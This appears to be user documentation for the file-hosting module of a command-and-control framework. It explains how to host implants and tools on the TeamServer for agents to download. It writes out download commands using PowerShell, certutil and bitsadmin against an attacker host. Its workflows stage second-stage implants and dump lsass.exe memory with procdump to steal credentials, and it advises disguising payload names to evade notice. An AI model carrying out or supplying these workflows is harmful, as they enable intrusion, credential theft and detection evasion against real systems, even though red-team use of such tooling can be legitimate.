# Hosting - File Hosting

## Overview

The **Hosting** module allows hosting files on the TeamServer so they can be downloaded via HTTP/HTTPS by agents or other systems.

## Features

### Host a File

1. Click the **"Host File"** button
2. Select a file in the selector
3. The file is uploaded and hosted
4. A download URL is generated

### Hosted Files Table

The table displays all hosted files with:

| Column | Description |
|---------|-------------|
| **Filename** | Filename |
| **URL** | Download URL |
| **Actions** | Action buttons |

## Available Actions

### Copy URL
- Button with copy icon
- Copies URL to clipboard
- Confirmation toast notification

### Delete File
- Button with delete icon
- Confirmation required
- File is no longer accessible

## Usage

### Download URL

The generated URL follows the format:
```
http://[listener-address]:[port]/[filename]
```

Example:
```
http://192.168.1.100:443/payload.exe
```

### Download from an Agent

Use appropriate commands to download:

#### PowerShell
```powershell
powershell Invoke-WebRequest -Uri "http://server/file.exe" -OutFile "C:\temp\file.exe"
powershell (New-Object Net.WebClient).DownloadFile("http://server/file.exe", "C:\temp\file.exe")
```

#### CMD
```cmd
shell certutil -urlcache -f http://server/file.exe C:\temp\file.exe
shell bitsadmin /transfer job http://server/file.exe C:\temp\file.exe
```

## Use Cases

### 1. Tool Deployment
```
1. Host a tool (e.g., procdump.exe)
2. Copy URL
3. From an agent: download the tool
4. Execute the tool
```

### 2. Payload Staging
```
1. Host an implant
2. Use URL in an exploit
3. Target downloads and executes
```

### 3. Reverse Exfiltration
```
1. Host a collection script
2. Agent downloads the script
3. Execute to collect data
```

## Best Practices

1. **Naming**: Use non-suspicious names (e.g., `update.exe` instead of `payload.exe`)
2. **Cleanup**: Delete files after use
3. **Security**: Don't leave sensitive files hosted indefinitely
4. **Monitoring**: Monitor downloads (listener logs)
5. **HTTPS**: Use an HTTPS listener to encrypt transfers

## Notifications

- ✅ **Hosting successful**: "File hosted successfully"
- ✅ **URL copied**: "URL copied to clipboard"
- ✅ **Deletion successful**: "File removed"
- ❌ **Error**: Error details

## Limitations

- Files are hosted as long as the listener is active
- If the listener is stopped, files are no longer accessible
- No specific size limit (depends on server)

## Workflow Examples

### Deploy a Tool on an Agent
```
1. In Hosting: Host "procdump.exe"
2. Copy URL: http://192.168.1.100/procdump.exe
3. In agent Terminal:
   powershell Invoke-WebRequest -Uri "http://192.168.1.100/procdump.exe" -OutFile "C:\temp\procdump.exe"
4. Execute: execute-pe C:\temp\procdump.exe -ma lsass.exe lsass.dmp
5. In Hosting: Delete procdump.exe
```

### Stage a Second Stage
```
1. Generate a secondary implant
2. In Hosting: Host the implant
3. Copy URL
4. From first agent: download and execute
5. New agent connects
```

## Security

⚠️ **Warning**:
- Hosted files are publicly accessible
- Don't host files containing credentials
- Use HTTPS to encrypt transfers
- Delete files immediately after use
- Monitor unauthorized access

## Alternatives

For more secure transfers, consider:
- Upload/Download via dedicated commands (if available)
- File encryption before hosting
- Using C2 channels for transfer
